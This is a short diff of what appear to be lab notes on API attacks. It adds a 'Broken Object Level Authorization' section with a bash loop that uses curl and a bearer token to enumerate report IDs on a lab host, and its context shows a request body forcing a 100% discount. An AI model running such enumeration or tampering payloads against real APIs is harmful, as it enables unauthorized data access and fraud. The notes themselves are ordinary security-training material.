@@ -50,3 +50,13 @@ Content-Length: 90
 
 {"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
 ```
+
+# Broken Object Level Authorization
+```bash
+for ((i=0;i<=20;i++))do 
+curl -s -w "\n" -X 'GET' \
+ 'http://94.237.52.208:42234/api/v1/supplier-companies/yearly-reports/'$i'' \
+ -H 'accept: application/json' \
+ -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZml>
+done
+```
